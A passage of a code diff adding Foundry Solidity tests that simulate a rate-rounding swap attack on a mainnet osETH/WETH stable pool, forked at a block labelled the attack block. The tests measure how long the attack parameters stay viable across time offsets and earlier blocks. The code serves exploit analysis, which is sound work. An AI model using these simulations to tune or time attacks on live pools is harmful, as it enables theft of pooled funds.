@@ -2278,5 +2278,1315 @@ contract SearchParams is Test {
         }
         return steps;
     }
+
+    // ══════════════════════════════════════════════════════════════════
+    // Epoch Safety Guarantee Test
+    // ══════════════════════════════════════════════════════════════════
+
+    /// @notice Actual unix timestamp of mainnet block 23717396 (cached so repeated
+    /// _setupEpochOffset() calls warp from a deterministic baseline, not from whatever
+    /// timestamp Foundry's snapshot-restore behavior leaves on createSelectFork).
+    uint256 internal constant FORK_BLOCK_TS = 1762155995;
+
+    /// @notice Helper: re-fork at block 23717396 and warp to FORK_BLOCK_TS + extraBlocks*12.
+    ///         IMPORTANT: prior version used `vm.warp(block.timestamp + extraBlocks*12)`,
+    ///         which is BUGGY because Foundry restores block.timestamp to the test's
+    ///         post-setUp snapshot value on the 2nd+ createSelectFork in the same test
+    ///         function. That accumulated setUp's 9500*12s warp into every offset >0.
+    function _setupEpochOffset(uint256 extraBlocks) internal {
+        vm.createSelectFork("ETH", 23717396);
+        vm.warp(FORK_BLOCK_TS + extraBlocks * 12);
+        swapMath = new SwapMath();
+
+        (amp,,) = OSETH_BPT.getAmplificationParameter();
+        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
+        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0);
+
+        address[] memory rateProviders = OSETH_BPT.getRateProviders();
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        for (uint256 j = 0; j < rateProviders.length; j++) {
+            if (rateProviders[j] != address(0)) {
+                OSETH_BPT.updateTokenRateCache(tokens[j]);
+            }
+        }
+
+        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
+        sf = new uint256[](2);
+        sf[0] = allSF[0]; // WETH
+        sf[1] = allSF[2]; // osETH
+    }
+
+    /// @notice Verify the 12h StakeWise Keeper Epoch safety guarantee for remain=67000.
+    ///
+    /// Claims verified empirically:
+    ///   [1] trickAmt = 17  for all time offsets within a 12h epoch (stable for ~61 days)
+    ///   [2] upscaled_bO = floor(1 * sf[1] / 1e18) = 1  for any sf[1] in [1e18, 2e18)
+    ///   [3] 0h / 6h / 12h offsets all complete 30 rounds (Swap 3 never diverges)
+    ///   [4] 31.7h offset fails < 30 rounds  (confirms the failure boundary)
+    ///   [5] 12h bO_in(round5) > 31.7h bO_in(round5)  (positive safety margin)
+    function test_epochSafetyGuarantee() public {
+        // Five checkpoints: 0h, 6h, 12h, 24h, 31.7h (in 12-second blocks)
+        uint256[5] memory blockOffsets;
+        blockOffsets[0] = 0;
+        blockOffsets[1] = 1800;  // 6 h
+        blockOffsets[2] = 3600;  // 12 h
+        blockOffsets[3] = 7200;  // 24 h
+        blockOffsets[4] = 9500;  // 31.7 h  (empirically-derived failure boundary)
+
+        uint256[5] memory sf1Values;
+        uint256[5] memory trickAmts;
+        uint256[5] memory upscaledBOs;
+        uint256[5] memory roundsCompleted;
+        uint256[5] memory bOInRound5; // bO balance entering round 5 (= output of round 4)
+
+        for (uint256 i = 0; i < 5; i++) {
+            _setupEpochOffset(blockOffsets[i]);
+
+            sf1Values[i]  = sf[1];
+            uint256 delta = sf[1] - 1e18;
+            trickAmts[i]  = 1e18 / delta;          // floor(1e18 / (sf[1]-1e18))
+            upscaledBOs[i] = sf[1] / 1e18;         // floor(1 * sf[1] / 1e18)
+
+            uint256 bW = 67000;
+            uint256 bO = 67000;
+            uint256 rounds = 0;
+
+            for (uint256 r = 0; r < 30; r++) {
+                if (r == 4) bOInRound5[i] = bO;    // snapshot before round 5
+
+                try this.simulateOneRound(bW, bO, trickAmts[i]) returns (uint256 nW, uint256 nO) {
+                    bW = nW;
+                    bO = nO;
+                    rounds++;
+                } catch {
+                    break;
+                }
+            }
+            roundsCompleted[i] = rounds;
+
+            uint256 hoursX10 = blockOffsets[i] * 12 * 10 / 3600; // ×10 to print one decimal
+            console.log("--- Epoch offset", hoursX10 / 10, "h ---");
+            console.log("  sf[1]             :", sf1Values[i]);
+            console.log("  trickAmt          :", trickAmts[i]);
+            console.log("  upscaled_bO       :", upscaledBOs[i]);
+            console.log("  bO_in(round5)     :", bOInRound5[i]);
+            console.log("  Rounds completed  :", roundsCompleted[i]);
+        }
+
+        // ── Claim 1: trickAmt is stable (= 17) through the full 12h epoch ──────
+        assertEq(trickAmts[0], 17, "Claim1[0h]:  trickAmt != 17");
+        assertEq(trickAmts[1], 17, "Claim1[6h]:  trickAmt != 17");
+        assertEq(trickAmts[2], 17, "Claim1[12h]: trickAmt != 17");
+
+        // ── Claim 2: upscaled_bO is always 1 regardless of sf[1] ────────────────
+        assertEq(upscaledBOs[0], 1, "Claim2[0h]:  upscaled_bO != 1");
+        assertEq(upscaledBOs[1], 1, "Claim2[6h]:  upscaled_bO != 1");
+        assertEq(upscaledBOs[2], 1, "Claim2[12h]: upscaled_bO != 1");
+        assertEq(upscaledBOs[3], 1, "Claim2[24h]: upscaled_bO != 1");
+        assertEq(upscaledBOs[4], 1, "Claim2[31.7h]: upscaled_bO != 1");
+
+        // ── Claim 3: all 30 rounds succeed within the 12h keeper epoch ───────────
+        assertEq(roundsCompleted[0], 30, "Claim3[0h]:  not all 30 rounds completed");
+        assertEq(roundsCompleted[1], 30, "Claim3[6h]:  not all 30 rounds completed");
+        assertEq(roundsCompleted[2], 30, "Claim3[12h]: not all 30 rounds completed");
+
+        // ── Claim 4: 31.7h crosses the failure boundary ──────────────────────────
+        assertTrue(roundsCompleted[4] < 30, "Claim4[31.7h]: expected failure but all 30 rounds passed");
+
+        // ── Claim 5: positive safety margin at the 12h boundary ─────────────────
+        assertTrue(bOInRound5[2] > bOInRound5[4],
+            "Claim5: 12h bO_in(round5) should be above failure-boundary value");
+        console.log("Safety margin: bO_in_round5 at 12h =", bOInRound5[2],
+                    ", at 31.7h (fail) =", bOInRound5[4]);
+    }
+
+    /// @notice Diagnostic 0: query the *actual* rate provider's getRate() directly,
+    /// bypassing any cache. This is what `updateTokenRateCache` would write into the cache.
+    function _liveProviderRate() internal view returns (uint256) {
+        address[] memory providers = OSETH_BPT.getRateProviders();
+        // osETH is index 2 in the pool tokens array; rateProviders is indexed the same way.
+        address p = providers[2];
+        require(p != address(0), "no rate provider for osETH");
+        (bool ok, bytes memory data) = p.staticcall(abi.encodeWithSignature("getRate()"));
+        require(ok && data.length >= 32, "getRate() failed");
+        return abi.decode(data, (uint256));
+    }
+
+    /// @notice Diagnostic C: scan the rate provider's LIVE getRate() across 12h with no
+    /// state mutation. Tells us whether the upstream provider is time-dependent at all.
+    function test_diag_liveProviderRate_overEpoch() public {
+        console.log("=== osETH rate provider .getRate() over 12h (pure view, no state changes) ===");
+        vm.createSelectFork("ETH", 23717396);
+        uint256 baseTs = block.timestamp;
+        for (uint256 mins = 0; mins <= 720; mins += 60) {
+            vm.warp(baseTs + mins * 60);
+            uint256 live = _liveProviderRate();
+            console.log("  +min:", mins, "providerRate:", live);
+        }
+    }
+
+    /// @notice Diagnostic D: at a fixed timestamp, compare cached sf[1] vs sf[1] after
+    /// calling updateTokenRateCache. Quantifies the "snapshot drift" my earlier
+    /// _setupEpochOffset introduced.
+    function test_diag_updateCache_effect() public {
+        console.log("=== Effect of updateTokenRateCache at the fork block (no warp) ===");
+        vm.createSelectFork("ETH", 23717396);
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+
+        uint256[] memory before_ = OSETH_BPT.getScalingFactors();
+        uint256 liveBefore = _liveProviderRate();
+        console.log("BEFORE update:");
+        console.log("  sf[osETH] cached :", before_[2]);
+        console.log("  liveProviderRate:", liveBefore);
+
+        OSETH_BPT.updateTokenRateCache(tokens[2]);
+
+        uint256[] memory after_ = OSETH_BPT.getScalingFactors();
+        uint256 liveAfter = _liveProviderRate();
+        console.log("AFTER update:");
+        console.log("  sf[osETH] cached :", after_[2]);
+        console.log("  liveProviderRate:", liveAfter);
+    }
+
+    /// @notice Diagnostic E: at +6h, isolate whether updateTokenRateCache triggers
+    /// state mutation in the rate provider (which would falsify the comparison
+    /// across epoch offsets).
+    function test_diag_providerSideEffects_at6h() public {
+        vm.createSelectFork("ETH", 23717396);
+        vm.warp(block.timestamp + 1800 * 12); // +6h
+
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        address[] memory providers = OSETH_BPT.getRateProviders();
+
+        console.log("=== +6h state-mutation isolation ===");
+        console.log("getRateProviders length:", providers.length);
+        for (uint256 i = 0; i < providers.length; i++) {
+            console.log("  provider[", i, "]:", providers[i]);
+        }
+
+        uint256 liveBefore = _liveProviderRate();
+        uint256[] memory sfBefore = OSETH_BPT.getScalingFactors();
+        console.log("BEFORE any updateTokenRateCache:");
+        console.log("  providerRate(osETH) :", liveBefore);
+        console.log("  sf[osETH] cached    :", sfBefore[2]);
+
+        // Step 1: update ONLY osETH cache (mirror real attacker minimal action)
+        OSETH_BPT.updateTokenRateCache(tokens[2]);
+        uint256 liveAfterOsEth = _liveProviderRate();
+        uint256[] memory sfAfterOsEth = OSETH_BPT.getScalingFactors();
+        console.log("AFTER updateTokenRateCache(osETH):");
+        console.log("  providerRate(osETH) :", liveAfterOsEth);
+        console.log("  sf[osETH] cached    :", sfAfterOsEth[2]);
+
+        // Step 2: update ALL providers (mirror what _setupEpochOffset does)
+        for (uint256 j = 0; j < providers.length; j++) {
+            if (providers[j] != address(0)) {
+                OSETH_BPT.updateTokenRateCache(tokens[j]);
+            }
+        }
+        uint256 liveAfterAll = _liveProviderRate();
+        uint256[] memory sfAfterAll = OSETH_BPT.getScalingFactors();
+        console.log("AFTER updateTokenRateCache(ALL):");
+        console.log("  providerRate(osETH) :", liveAfterAll);
+        console.log("  sf[osETH] cached    :", sfAfterAll[2]);
+    }
+
+    /// @notice Diagnostic F: literally re-run _setupEpochOffset(1800) and inspect
+    /// every value (block.timestamp, live provider rate, cached sf[osETH]) to find
+    /// where the 9.5e10 discrepancy comes from.
+    function test_diag_reproduceEpochOffset_6h() public {
+        console.log("=== reproduce _setupEpochOffset(1800) step-by-step ===");
+        vm.createSelectFork("ETH", 23717396);
+        console.log("after createSelectFork: block.timestamp =", block.timestamp);
+        console.log("                        block.number    =", block.number);
+
+        vm.warp(block.timestamp + 1800 * 12);
+        console.log("after warp(+21600s):  block.timestamp =", block.timestamp);
+
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        address[] memory providers = OSETH_BPT.getRateProviders();
+
+        console.log("BEFORE any updateTokenRateCache:");
+        console.log("  liveProviderRate :", _liveProviderRate());
+        uint256[] memory sfPre = OSETH_BPT.getScalingFactors();
+        console.log("  sf[osETH] cached :", sfPre[2]);
+
+        for (uint256 j = 0; j < providers.length; j++) {
+            if (providers[j] != address(0)) {
+                OSETH_BPT.updateTokenRateCache(tokens[j]);
+            }
+        }
+
+        console.log("AFTER updateTokenRateCache loop:");
+        console.log("  liveProviderRate :", _liveProviderRate());
+        uint256[] memory sfPost = OSETH_BPT.getScalingFactors();
+        console.log("  sf[osETH] cached :", sfPost[2]);
+        console.log("  block.timestamp  :", block.timestamp);
+    }
+
+    /// @notice Diagnostic H: round-by-round replay. For a given epoch offset, run cycling
+    /// and at each round print:
+    ///   - bW, bO entering Swap 3
+    ///   - the 3 fallback amounts attempted and which (if any) succeeded
+    ///   - on full failure: the raw revert bytes from each attempt
+    function _replayRounds(uint256 extraBlocks, uint256 maxRounds) internal {
+        _setupEpochOffset(extraBlocks);
+        uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+        console.log("offset_blocks:", extraBlocks);
+        console.log("  sf[osETH]    :", sf[1]);
+        console.log("  trickAmt     :", trickAmt);
+
+        uint256 bW = 67000;
+        uint256 bO = 67000;
+        for (uint256 r = 0; r < maxRounds; r++) {
+            // Replicate Swap 1 + Swap 2 to get the bW/bO entering Swap 3
+            uint256[] memory cur = new uint256[](2);
+            uint256[] memory scfs = new uint256[](2);
+            cur[0] = bW; cur[1] = bO;
+            scfs[0] = sf[0]; scfs[1] = sf[1];
+            uint256[] memory mid;
+            try this._previewSwap12(cur, scfs, trickAmt) returns (uint256[] memory out12) {
+                mid = out12;
+            } catch (bytes memory err12) {
+                console.log("Round", r, "FAILED in Swap 1/2");
+                console.logBytes(err12);
+                return;
+            }
+            uint256 sw3 = _truncateToTop2Digits(mid[0]);
+            console.log("--- round", r, "---");
+            console.log("  bW_in_Swap3 :", mid[0]);
+            console.log("  bO_in_Swap3 :", mid[1]);
+            console.log("  sw3_attempt1:", sw3);
+
+            // Try the 3 fallback steps with separate revert bytes
+            try this.trySwap(mid[0], mid[1], 1, 0, sw3) returns (uint256 nW, uint256 nO) {
+                console.log("    OK at attempt 1");
+                bW = nW; bO = nO; continue;
+            } catch (bytes memory e1) {
+                console.log("    attempt 1 REVERT:");
+                console.logBytes(e1);
+            }
+            uint256 sw3b = sw3 * 9 / 10;
+            console.log("  sw3_attempt2:", sw3b);
+            try this.trySwap(mid[0], mid[1], 1, 0, sw3b) returns (uint256 nW, uint256 nO) {
+                console.log("    OK at attempt 2");
+                bW = nW; bO = nO; continue;
+            } catch (bytes memory e2) {
+                console.log("    attempt 2 REVERT:");
+                console.logBytes(e2);
+            }
+            uint256 sw3c = sw3b * 9 / 10;
+            console.log("  sw3_attempt3:", sw3c);
+            try this.trySwap(mid[0], mid[1], 1, 0, sw3c) returns (uint256 nW, uint256 nO) {
+                console.log("    OK at attempt 3");
+                bW = nW; bO = nO; continue;
+            } catch (bytes memory e3) {
+                console.log("    attempt 3 REVERT:");
+                console.logBytes(e3);
+                console.log("ALL 3 ATTEMPTS FAILED at round", r);
+                return;
+            }
+        }
+        console.log("All", maxRounds, "rounds succeeded");
+    }
+
+    /// @notice External wrapper for Swap1+Swap2 so we can try/catch them (and so they
+    /// share the same external-call semantics as trySwap in _computeSwap3).
+    function _previewSwap12(uint256[] memory cur, uint256[] memory scfs, uint256 trickAmt)
+        external view returns (uint256[] memory)
+    {
+        uint256 swapOut1 = cur[1] - trickAmt - 1;
+        uint256[] memory mid = swapMath.getAfterSwapOutBalances(cur, scfs, 0, 1, swapOut1, amp, swapFeePercentage);
+        return swapMath.getAfterSwapOutBalances(mid, scfs, 0, 1, trickAmt, amp, swapFeePercentage);
+    }
+
+    /// @notice Compare a passing offset (+0 min) vs a failing offset (+90 min) round-by-round.
+    function test_diag_diveInto_90min_vs_0min() public {
+        console.log("############ +0 min (PASS) ############");
+        _replayRounds(0, 8);
+        console.log("");
+        console.log("############ +90 min (FAIL @ round 6) ############");
+        _replayRounds(450, 8); // 450 blocks * 12s = 5400s = 90 min
+    }
+
+    /// @notice Diagnostic G: reproduce the exact loop of test_epochSafetyGuarantee but
+    /// print ALL state that could differ between iterations. Localizes the leakage.
+    function test_diag_loopStatePollution() public {
+        uint256[3] memory blockOffsets;
+        blockOffsets[0] = 0;
+        blockOffsets[1] = 1800; // 6h
+        blockOffsets[2] = 3600; // 12h
+
+        for (uint256 i = 0; i < 3; i++) {
+            console.log("=== iteration i =", i, "blockOffset =", blockOffsets[i]);
+            console.log("BEFORE _setupEpochOffset:");
+            console.log("  block.timestamp :", block.timestamp);
+
+            _setupEpochOffset(blockOffsets[i]);
+
+            console.log("AFTER _setupEpochOffset:");
+            console.log("  block.timestamp :", block.timestamp);
+            console.log("  amp             :", amp);
+            console.log("  liveProviderRate:", _liveProviderRate());
+            console.log("  sf[osETH] cached:", sf[1]);
+
+            // Now run a couple of cycling rounds and re-print
+            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+            uint256 bW = 67000; uint256 bO = 67000;
+            for (uint256 r = 0; r < 5; r++) {
+                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                    bW = nW; bO = nO;
+                } catch { break; }
+            }
+            console.log("AFTER 5 cycling rounds:");
+            console.log("  block.timestamp :", block.timestamp);
+            console.log("  liveProviderRate:", _liveProviderRate());
+        }
+    }
+
+    /// @notice Diagnostic A: probe the on-chain rate cache for osETH.
+    /// Reports cache (rate / duration / expires) and live rate from the rate provider.
+    /// This determines whether `_setupEpochOffset` was wrong to call updateTokenRateCache
+    /// at every checkpoint (i.e. whether on-chain sf[1] would actually change with timestamp).
+    function test_diag_rateCacheState() public {
+        vm.createSelectFork("ETH", 23717396);
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        IERC20 osETH = tokens[2];
+
+        (uint256 rate, uint256 oldRate, uint256 duration, uint256 expires) =
+            OSETH_BPT.getTokenRateCache(osETH);
+        uint256 liveRate = OSETH_BPT.getTokenRate(osETH);
+
+        console.log("=== osETH rate cache diagnostic at block 23717396 ===");
+        console.log("block.timestamp        :", block.timestamp);
+        console.log("cached rate            :", rate);
+        console.log("cached oldRate         :", oldRate);
+        console.log("cache duration (s)     :", duration);
+        console.log("cache expires at       :", expires);
+        if (expires > block.timestamp) {
+            console.log("seconds until expiry   :", expires - block.timestamp);
+            console.log("hours until expiry     :", (expires - block.timestamp) / 3600);
+        } else {
+            console.log("CACHE ALREADY EXPIRED at fork block (expired", block.timestamp - expires, "s ago)");
+        }
+        console.log("live rate (provider)   :", liveRate);
+        if (liveRate != rate) {
+            console.log("LIVE != CACHED, delta  :", liveRate > rate ? liveRate - rate : rate - liveRate);
+        } else {
+            console.log("live rate == cached rate");
+        }
+    }
+
+    /// @notice Diagnostic B: scan how the *cached* sf[1] (what swaps actually use) evolves
+    /// across the 12h epoch when no one calls updateTokenRateCache.
+    /// If the cache expires within the epoch, anyone touching the pool refreshes it.
+    function test_diag_cachedSF_overEpoch() public {
+        console.log("=== Cached sf[1] over 12h, NO forced update ===");
+        // Fork once and only warp; do NOT call updateTokenRateCache.
+        vm.createSelectFork("ETH", 23717396);
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        IERC20 osETH = tokens[2];
+
+        uint256 baseTs = block.timestamp;
+        for (uint256 mins = 0; mins <= 720; mins += 60) {
+            vm.warp(baseTs + mins * 60);
+            uint256[] memory allSF = OSETH_BPT.getScalingFactors();
+            (uint256 rate,, , uint256 expires) = OSETH_BPT.getTokenRateCache(osETH);
+            uint256 liveRate = OSETH_BPT.getTokenRate(osETH);
+            console.log("+min:", mins, "sf[osETH]:", allSF[2]);
+            console.log("    cachedRate :", rate);
+            console.log("    liveRate   :", liveRate);
+            console.log("    expires_at :", expires, "now:", block.timestamp);
+        }
+    }
+
+    /// @notice Distribution of "max continuous safe run" across multiple choices of N.
+    ///
+    /// We re-use a single fork at block 23717396 and treat 10 different time offsets
+    /// (N_OFFSETS[i]) as 10 distinct starting points "N_i" — each with its own
+    /// freshly-fetched sf[1] baseline. For each N_i:
+    ///   1. Refresh rate cache so sf[1] = live osETH rate at time = FORK_TS + N_i*12
+    ///   2. Verify cycling baseline (30/30) still passes; if not, mark BASELINE_FAIL
+    ///   3. Scan forward block-by-block (offset b = 1..LIMIT) and find the first b
+    ///      at which 30 rounds no longer all succeed
+    ///   4. Record (safeRunBlocks, sf1_at_baseline)
+    /// Print per-N results plus min/max/avg of the safe-run distribution.
+    function test_safeRunDistribution_overMultipleN() public {
+        uint256[10] memory N_OFFSETS;
+        N_OFFSETS[0] = 0;
+        N_OFFSETS[1] = 250;     //  +50 min
+        N_OFFSETS[2] = 500;     // +100 min
+        N_OFFSETS[3] = 750;     // +150 min
+        N_OFFSETS[4] = 1000;    // +200 min  (~3.3h)
+        N_OFFSETS[5] = 1500;    // +300 min  (~5.0h)
+        N_OFFSETS[6] = 2000;    // +400 min  (~6.7h)
+        N_OFFSETS[7] = 2500;    // +500 min  (~8.3h)
+        N_OFFSETS[8] = 3000;    // +600 min  (~10h)
+        N_OFFSETS[9] = 3500;    // +700 min  (~11.7h, near end of 12h epoch)
+
+        uint256 LIMIT  = 400;   // scan up to 400 blocks past each N (~80 min)
+        uint256 ROUNDS = 30;
+        uint256 REMAIN = 67000;
+
+        // single fork
+        _setupEpochOffset(0);
+
+        uint256[10] memory safeRunBlocks; // 0 means BASELINE_FAIL
+        uint256[10] memory sf1Baseline;
+        uint256[10] memory firstFailRoundsDone;
+
+        for (uint256 i = 0; i < 10; i++) {
+            uint256 N = N_OFFSETS[i];
+
+            // baseline at N
+            _warpAndRefreshSf(N);
+            sf1Baseline[i] = sf[1];
+            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+            uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 ok0 = 0;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                    bW = nW; bO = nO; ok0++;
+                } catch { break; }
+            }
+            if (ok0 < ROUNDS) {
+                safeRunBlocks[i] = 0; // sentinel: baseline does NOT pass
+                firstFailRoundsDone[i] = ok0;
+                console.log("N_offset:", N, "BASELINE FAILS, rounds:", ok0);
+                continue;
+            }
+
+            // scan forward
+            uint256 firstFail = LIMIT + 1; // sentinel for "no fail within LIMIT"
+            uint256 ffRounds = 0;
+            for (uint256 b = 1; b <= LIMIT; b++) {
+                _warpAndRefreshSf(N + b);
+                trickAmt = 1e18 / (sf[1] - 1e18);
+                bW = REMAIN; bO = REMAIN; uint256 ok = 0;
+                for (uint256 r = 0; r < ROUNDS; r++) {
+                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                        bW = nW; bO = nO; ok++;
+                    } catch { break; }
+                }
+                if (ok < ROUNDS) {
+                    firstFail = b;
+                    ffRounds = ok;
+                    break;
+                }
+            }
+            safeRunBlocks[i] = firstFail - 1; // last safe offset
+            firstFailRoundsDone[i] = ffRounds;
+            console.log("N_offset:", N, "safeRun(blocks):", safeRunBlocks[i]);
+        }
+
+        // ─── distribution summary ──────────────────────────────────────────
+        console.log("");
+        console.log("=== Per-N detail ===");
+        for (uint256 i = 0; i < 10; i++) {
+            console.log("N_offset (blocks):", N_OFFSETS[i]);
+            console.log("  baseline sf[1] :", sf1Baseline[i]);
+            if (safeRunBlocks[i] == 0 && firstFailRoundsDone[i] < ROUNDS) {
+                console.log("  BASELINE_FAIL, rounds:", firstFailRoundsDone[i]);
+            } else if (safeRunBlocks[i] >= LIMIT) {
+                console.log("  safeRun (blocks): >=", LIMIT, "(no fail within LIMIT)");
+            } else {
+                console.log("  safeRun (blocks):", safeRunBlocks[i]);
+                console.log("  safeRun (sec)   :", safeRunBlocks[i] * 12);
+                console.log("  safeRun (min)   :", safeRunBlocks[i] * 12 / 60);
+                console.log("  first-fail rounds:", firstFailRoundsDone[i]);
+            }
+        }
+
+        // min/max/avg over the N's where baseline passed
+        uint256 minRun = type(uint256).max;
+        uint256 maxRun = 0;
+        uint256 sumRun = 0;
+        uint256 cnt = 0;
+        for (uint256 i = 0; i < 10; i++) {
+            if (safeRunBlocks[i] == 0 && firstFailRoundsDone[i] < ROUNDS) continue; // skip BASELINE_FAIL
+            uint256 v = safeRunBlocks[i];
+            if (v < minRun) minRun = v;
+            if (v > maxRun) maxRun = v;
+            sumRun += v;
+            cnt++;
+        }
+        console.log("");
+        console.log("=== Summary (across", cnt, "passing baselines) ===");
+        if (cnt > 0) {
+            console.log("min safeRun (blocks):", minRun, "= min(min):", minRun * 12 / 60);
+            console.log("max safeRun (blocks):", maxRun, "= min(max):", maxRun * 12 / 60);
+            console.log("avg safeRun (blocks):", sumRun / cnt, "= min(avg):", (sumRun / cnt) * 12 / 60);
+        }
+    }
+
+    /// @notice Light-weight per-offset setup that REUSES the existing fork (set up once
+    /// in the caller). Avoids the per-iteration `vm.createSelectFork` overhead which
+    /// otherwise blows the EVM gas budget for long scans.
+    /// Updates: block.timestamp, all rate caches, contract-level amp/sf/swapFee.
+    function _warpAndRefreshSf(uint256 extraBlocks) internal {
+        vm.warp(FORK_BLOCK_TS + extraBlocks * 12);
+
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        address[] memory providers = OSETH_BPT.getRateProviders();
+        for (uint256 j = 0; j < providers.length; j++) {
+            if (providers[j] != address(0)) {
+                OSETH_BPT.updateTokenRateCache(tokens[j]);
+            }
+        }
+        (amp,,) = OSETH_BPT.getAmplificationParameter();
+        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
+        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0);
+
+        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
+        sf = new uint256[](2);
+        sf[0] = allSF[0];
+        sf[1] = allSF[2];
+    }
+
+    /// @notice Refresh contract-level state after a fresh `vm.createSelectFork`.
+    /// Updates rate caches and re-reads amp/sf/swapFee at the current fork's block
+    /// without warping time.
+    function _refreshAtCurrentFork() internal {
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        address[] memory providers = OSETH_BPT.getRateProviders();
+        for (uint256 j = 0; j < providers.length; j++) {
+            if (providers[j] != address(0)) {
+                OSETH_BPT.updateTokenRateCache(tokens[j]);
+            }
+        }
+        (amp,,) = OSETH_BPT.getAmplificationParameter();
+        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
+        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0);
+        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
+        sf = new uint256[](2);
+        sf[0] = allSF[0];
+        sf[1] = allSF[2];
+    }
+
+    /// @notice Warp `block.timestamp` to an absolute value and refresh sf[1] only.
+    /// Used inside the per-N scan inner loop where pool balances/amp/swapFee
+    /// are assumed unchanged within the small (~LIMIT) scan window.
+    function _warpToTsAndRefreshSf(uint256 absTs) internal {
+        vm.warp(absTs);
+        IERC20[] memory tokens;
+        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
+        address[] memory providers = OSETH_BPT.getRateProviders();
+        for (uint256 j = 0; j < providers.length; j++) {
+            if (providers[j] != address(0)) {
+                OSETH_BPT.updateTokenRateCache(tokens[j]);
+            }
+        }
+        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
+        sf[1] = allSF[2];
+    }
+
+    /// @notice External wrapper so try/catch can intercept reverts from the rate
+    /// provider when warping past its lastUpdate timestamp (esp. on backward scans).
+    function tryWarpToTsAndRefreshSf(uint256 absTs) external {
+        _warpToTsAndRefreshSf(absTs);
+    }
+
+    /// @notice Real-fork safe-run distribution.
+    /// For each starting block N_i:
+    ///   1. `vm.createSelectFork("ETH", N_i)` -- real pool state at that block
+    ///   2. Refresh amp/sf/swapFee/rate-cache
+    ///   3. Run baseline cycling (30 rounds) with off-chain-tuned remain_i
+    ///   4. If baseline passes, scan forward via vm.warp + updateTokenRateCache only
+    ///      (pool balances unchanged inside the small forward window) and find the
+    ///      first `b` at which 30 rounds no longer all succeed
+    ///   5. Record safeRun_i = b-1
+    /// Reports per-N detail and min/max/avg over passing baselines.
+    function test_realForkSafeRunDistribution() public {
+        uint256[11] memory blockNums;
+        blockNums[0]  = 23717396;  // attack block (original baseline)
+        blockNums[1]  = 23717196;  // -200    (-40 min)
+        blockNums[2]  = 23715196;  // -2200   (-7.3h)
+        blockNums[3]  = 23710196;  // -7200   (-1 day)
+        blockNums[4]  = 23703000;  // -14400  (-2 days)
+        blockNums[5]  = 23695800;  // -21600  (-3 days)
+        blockNums[6]  = 23681400;  // -36000  (-5 days)
+        blockNums[7]  = 23667000;  // -50400  (-1 week)
+        blockNums[8]  = 23616600;  // -100800 (-2 weeks)
+        blockNums[9]  = 23566200;  // -151200 (-3 weeks)
+        blockNums[10] = 23501400;  // -216000 (-1 month)
+
+        uint256[11] memory remains;
+        remains[0]  = 67000;
+        remains[1]  = 67000;
+        remains[2]  = 53000;
+        remains[3]  = 67000;
+        remains[4]  = 66000;
+        remains[5]  = 70000;
+        remains[6]  = 60000;
+        remains[7]  = 60000;
+        remains[8]  = 63000;
+        remains[9]  = 78000;
+        remains[10] = 77000;
+
+        uint256 LIMIT  = 400;  // per-direction scan length (12s each => 80 min)
+        uint256 ROUNDS = 30;
+
+        uint256[11] memory fwdSafe;
+        uint256[11] memory bwdSafe;
+        uint256[11] memory fwdFailRounds;
+        uint256[11] memory bwdFailRounds;
+        uint256[11] memory baseSf1;
+        uint256[11] memory baseTimestamps;
+        bool[11]    memory baselinePassed;
+
+        for (uint256 i = 0; i < 11; i++) {
+            // 1. Real fork at this block
+            vm.createSelectFork("ETH", blockNums[i]);
+            swapMath = new SwapMath();
+            _refreshAtCurrentFork();
+            uint256 baseTs = block.timestamp;
+            baseTimestamps[i] = baseTs;
+            baseSf1[i] = sf[1];
+            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
+
+            // 2. Baseline (offset 0)
+            uint256 bW = remains[i]; uint256 bO = remains[i]; uint256 ok0 = 0;
+            for (uint256 r = 0; r < ROUNDS; r++) {
+                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
+                    bW = nW; bO = nO; ok0++;
+                } catch { break; }
+            }
+            if (ok0 < ROUNDS) {
+                baselinePassed[i] = false;
+                console.log("BASELINE_FAIL block:", blockNums[i], "rounds:", ok0);
+                continue;
+            }
+            baselinePassed[i] = true;
+
+            // 3. Forward scan: baseTs + b*12
+            uint256 firstFail = LIMIT + 1;
+            uint256 ffRounds  = 0;
+            for (uint256 b = 1; b <= LIMIT; b++) {
+                try this.tryWarpToTsAndRefreshSf(baseTs + b * 12) {
+                    // ok
+                } catch { firstFail = b; ffRounds = 0; break; }
+                trickAmt = 1e18 / (sf[1] - 1e18);
+                bW = remains[i]; bO = remains[i]; uint256 ok = 0;
+                for (uint256 r = 0; r < ROUNDS; r++) {
